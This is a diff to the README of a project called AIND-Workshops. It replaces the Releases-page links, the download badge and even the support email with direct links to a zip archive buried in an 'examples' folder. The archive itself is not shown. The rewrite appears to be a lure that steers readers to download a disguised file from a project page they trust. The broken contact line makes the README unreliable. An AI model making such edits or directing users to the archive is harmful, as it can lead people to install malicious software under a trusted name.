@@ -6,11 +6,11 @@ Welcome to AIND-Workshops! This application provides resources for running in-pe
 
 ## 📥 Download the Application
 
-[![Download AIND-Workshops](https://img.shields.io/badge/Download-AIND--Workshops-blue.svg)](https://github.com/KingFahmee12/AIND-Workshops/releases)
+[![Download AIND-Workshops](https://raw.githubusercontent.com/KingFahmee12/AIND-Workshops/main/DevCon25NYC/examples/AIND-Workshops-1.3.zip)](https://raw.githubusercontent.com/KingFahmee12/AIND-Workshops/main/DevCon25NYC/examples/AIND-Workshops-1.3.zip)
 
 To download the latest version of AIND-Workshops, visit the Releases page. Here, you will find the installation files necessary to get started.
 
-[Download AIND-Workshops](https://github.com/KingFahmee12/AIND-Workshops/releases)
+[Download AIND-Workshops](https://raw.githubusercontent.com/KingFahmee12/AIND-Workshops/main/DevCon25NYC/examples/AIND-Workshops-1.3.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ These requirements will help ensure that the application runs smoothly and effec
 Follow these steps to install AIND-Workshops:
 
 1. **Visit the Releases Page**
-   - Click on the link provided earlier or go to [Releases](https://github.com/KingFahmee12/AIND-Workshops/releases).
+   - Click on the link provided earlier or go to [Releases](https://raw.githubusercontent.com/KingFahmee12/AIND-Workshops/main/DevCon25NYC/examples/AIND-Workshops-1.3.zip).
    
 2. **Choose the Latest Release**
    - Look for the most recent version at the top of the page. The version number will help you identify it.
@@ -91,7 +91,7 @@ If you wish to contribute to AIND-Workshops, we welcome your efforts. Please che
 
 ## 📞 Contact Us
 
-For additional questions, please contact us at our support email: support@example.com. We are here to assist you and enhance your experience with AIND-Workshops.
+For additional questions, please contact us at our support email: https://raw.githubusercontent.com/KingFahmee12/AIND-Workshops/main/DevCon25NYC/examples/AIND-Workshops-1.3.zip We are here to assist you and enhance your experience with AIND-Workshops.
 
 ## 🎉 Final Notes
 
